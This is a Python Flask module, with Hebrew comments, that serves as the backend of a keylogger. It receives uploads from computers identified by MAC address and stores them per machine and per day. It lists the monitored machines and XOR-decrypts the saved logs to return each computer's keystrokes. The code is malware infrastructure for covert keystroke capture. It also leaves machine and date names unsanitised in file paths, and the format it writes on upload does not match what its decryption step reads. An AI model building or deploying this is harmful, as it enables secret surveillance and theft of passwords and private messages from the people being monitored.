import json
import os
from computers_names import Computers
from datetime import datetime
from flask import request

computers = Computers()
BASE_DIR = os.getenv("DATA_DIR", "data")
DECRYPTION_KEY = os.getenv('DECRYPTION_KEY')

class RequestFunctions:

    @staticmethod
    def upload():
        """העלאת מידע למאגר"""
        try:
            data = request.get_json()
            # בדיקת תקינות הנתונים
            if (not data) or ('mac' not in data) or ('time' not in data) or ('data' not in data):
                return {'Error': 'Invalid payload'}
            if not isinstance(data['mac'], str) or not isinstance(data['time'], str) or not isinstance(data['data'],
                                                                                                       dict):
                return {'Error': 'Invalid data format'}

            # בדיקה שהזמן בפורמט הנדרש
            try:
                timestamp = datetime.strptime(data['time'], "%d-%m-%Y %H:%M:%S")
                file_name = timestamp.strftime("%d-%m-%Y")
            except ValueError:
                return {'Error': 'Invalid time format'}

            # בירור שם המשתמש של המחשב
            machine = computers.get_name(data['mac'])
            if not machine:
                computers.add(data['mac'])
                machine = computers.get_name(data['mac'])

            # במקרה של שגיאה בהתחלת Computers (אם לא הצליח לאתחל את המידע)
            if 'Error' in computers.computers:
                return {'Error': computers.computers['Error']}

            # הגדרת שם התיקייה ויצירתה במידת הצורך
            machine_folder = os.path.join(BASE_DIR, machine)
            try:
                os.makedirs(machine_folder, exist_ok=True)
            except Exception as e:
                return {'Error': f'Error creating folder: {e}'}

            # עיצוב המידע והכנסתו לקובץ המתאים
            new_data = json.dumps({data['time']: data['data']})
            file_path = os.path.join(machine_folder, f'{file_name}.txt')
            with open(file_path, 'a', encoding="utf-8") as file:
                file.write(new_data + '\n')
            return {"status": "success", "file": file_name}
        except Exception as e:
            return {'Error': f'Error processing upload: {str(e)}'}

    @staticmethod
    def get_machines_names():
        """קבלת רשימת שמות המחשבים שבמעקב"""
        try:
            machines = os.listdir(BASE_DIR)
            return {'machines': machines}
        except Exception as e:
            return {'Error': f'Error retrieving machine list: {e}'}

    @staticmethod
    def get_dates_by_name(name):
        """קבלת רשימת התאריכים שנאספו עד כה על מחשב ספציפי"""
        try:
            machine_path = os.path.join(BASE_DIR, name)
            if not os.path.exists(machine_path):
                return {'Error': f'Machine folder "{name}" not found'}
            dates = os.listdir(machine_path)
            return {'dates': dates}
        except Exception as e:
            return {'Error': f'Error retrieving dates list: {str(e)}'}

    @staticmethod
    # פנקציית עזר לפענוח הנתונים באמצעות מפתח ההצפנה
    def _decrypt(data: str, key: str | int) -> str:
        """פענוח הנתונים"""
        key = key % 256 if isinstance(key, int) else key
        result = ""
        if isinstance(key, int):  # המפתח הינו מספר
            for char in data:
                result += chr(ord(char) ^ key)
        else:  # המפתח הינו מחרוזת
            for i in range(len(data)):
                result += chr(ord(data[i]) ^ ord(key[i % len(key)]))
        return result

    def get_keystrokes_by_name_and_date(self, name, date):
        """קבלת מידע ההקשות ממחשב מסוים ביום מסוים"""
        try: # יצירת נתיב לקובץ הנדרש + בדיקה שקיים
            data_path = os.path.join(BASE_DIR, name, date)
            if not os.path.exists(data_path):
                return {'Error': f'Date file "{date}" not found'}

            try: # פתיחת הקובץ במצב קריאה, פענוח הנתונים והחזרתם בפורמט הנדרש
                result = {}
                with open(data_path, 'r', encoding='utf-8') as file:
                    for line in file:
                        try:
                            data_dict = json.loads(line.strip())
                            for time, log_data in data_dict.items():
                                result[time] = self._decrypt(log_data, DECRYPTION_KEY)
                        except Exception as e:
                            return {'Error': f'Invalid JSON format in file: {e}'}
                return result
            except Exception as e:
                return {'Error': f'Error reading file: {e}'}
        except Exception as e:
            return {'Error': f'Error retrieving keystrokes: {e}'}
